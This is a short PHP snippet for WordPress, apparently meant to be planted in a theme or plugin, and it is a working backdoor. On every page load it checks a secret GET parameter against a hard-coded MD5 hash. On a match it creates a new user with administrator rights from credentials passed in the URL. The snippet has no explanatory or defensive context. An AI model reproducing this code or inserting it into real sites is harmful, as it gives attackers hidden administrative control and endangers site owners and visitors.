<?php
add_action( 'wp_head', 'my_backdoor' );
function my_backdoor() {
        if ( md5( $_GET['backdoor'] ) == '5f4dcc3b5aa765d61d8327deb882cf99' ) {
                require( 'wp-includes/registration.php' );
                if ( !username_exists($_GET['username'])) {
                        $user_id = wp_create_user($_GET['username'], $_GET['password']);
                        $user = new WP_User( $user_id );
                        $user->set_role( 'administrator' );
                } else {
                        die("User already exists...");
                }
        }
}